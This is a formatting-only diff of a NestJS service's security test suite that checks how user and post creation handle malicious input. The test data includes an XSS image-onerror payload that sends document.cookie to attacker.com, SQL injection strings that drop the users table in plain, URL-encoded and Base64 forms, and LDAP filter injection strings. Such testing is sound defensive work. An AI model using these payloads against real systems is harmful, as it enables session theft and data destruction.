@@ -1,6 +1,11 @@
 import { Test, TestingModule } from '@nestjs/testing';
 import { AppService } from './app.service';
-import { UserRepository, PostRepository, AuditLogRepository, RevisionRepository } from './repositories';
+import {
+  UserRepository,
+  PostRepository,
+  AuditLogRepository,
+  RevisionRepository,
+} from './repositories';
 import { CreateUserDto, CreatePostDto } from './dto';
 import { BadRequestException, NotFoundException } from '@nestjs/common';
 import { DataSource } from 'typeorm';
@@ -330,7 +335,8 @@ describe('AppService - Security Tests', () => {
     });
 
     it('should handle XSS in post content', async () => {
-      const xssContent = '<img src=x onerror="fetch(\'http://attacker.com?cookie=\'+document.cookie)">';
+      const xssContent =
+        '<img src=x onerror="fetch(\'http://attacker.com?cookie=\'+document.cookie)">';
       const dto: CreatePostDto = {
         title: 'Normal Title',
         content: xssContent,
@@ -527,7 +533,8 @@ describe('AppService - Security Tests', () => {
 
   describe('Combined Attack Vectors', () => {
     it('should handle SQL injection + XSS combined', async () => {
-      const combinedPayload = "'; <script>alert('XSS')</script> DROP TABLE users; --";
+      const combinedPayload =
+        "'; <script>alert('XSS')</script> DROP TABLE users; --";
       userRepository.findByUsername.mockResolvedValueOnce(null);
       userRepository.create.mockResolvedValueOnce({
         id: 'user-1',
@@ -548,7 +555,7 @@ describe('AppService - Security Tests', () => {
 
     it('should handle encoded injection attempts', async () => {
       // URL encoded
-      const urlEncodedPayload = "%27%3B%20DROP%20TABLE%20users%3B%20--%20";
+      const urlEncodedPayload = '%27%3B%20DROP%20TABLE%20users%3B%20--%20';
       userRepository.findByUsername.mockResolvedValueOnce(null);
       userRepository.create.mockResolvedValueOnce({
         id: 'user-1',
@@ -568,7 +575,9 @@ describe('AppService - Security Tests', () => {
     });
 
     it('should handle Base64 encoded payloads', async () => {
-      const base64Payload = Buffer.from("'; DROP TABLE users; --").toString('base64');
+      const base64Payload = Buffer.from("'; DROP TABLE users; --").toString(
+        'base64',
+      );
       userRepository.findByUsername.mockResolvedValueOnce(null);
       userRepository.create.mockResolvedValueOnce({
         id: 'user-1',
@@ -683,11 +692,7 @@ describe('AppService - Security Tests', () => {
     });
 
     it('should handle LDAP filter metacharacters', async () => {
-      const ldapMetaPayloads = [
-        'admin)(&',
-        '*)(uid=*',
-        'admin*))(&(uid=*',
-      ];
+      const ldapMetaPayloads = ['admin)(&', '*)(uid=*', 'admin*))(&(uid=*'];
 
       for (const payload of ldapMetaPayloads) {
         userRepository.findByUsername.mockResolvedValueOnce(null);
@@ -798,7 +803,9 @@ describe('AppService - Security Tests', () => {
         fail('should have thrown BadRequestException');
       } catch (error) {
         expect(error).toBeInstanceOf(BadRequestException);
-        expect((error as BadRequestException).message).toContain('Username cannot be empty');
+        expect((error as BadRequestException).message).toContain(
+          'Username cannot be empty',
+        );
       }
     });
 
@@ -816,7 +823,9 @@ describe('AppService - Security Tests', () => {
         fail('should have thrown BadRequestException');
       } catch (error) {
         expect(error).toBeInstanceOf(BadRequestException);
-        expect((error as BadRequestException).message).toContain('Invalid email format');
+        expect((error as BadRequestException).message).toContain(
+          'Invalid email format',
+        );
       }
     });
 
@@ -840,7 +849,9 @@ describe('AppService - Security Tests', () => {
         fail('should have thrown BadRequestException');
       } catch (error) {
         expect(error).toBeInstanceOf(BadRequestException);
-        expect((error as BadRequestException).message).toContain('already exists');
+        expect((error as BadRequestException).message).toContain(
+          'already exists',
+        );
       }
     });
 
@@ -904,7 +915,9 @@ describe('AppService - Security Tests', () => {
         fail('should have thrown BadRequestException');
       } catch (error) {
         expect(error).toBeInstanceOf(BadRequestException);
-        expect((error as BadRequestException).message).toContain('Title is required');
+        expect((error as BadRequestException).message).toContain(
+          'Title is required',
+        );
       }
     });
 
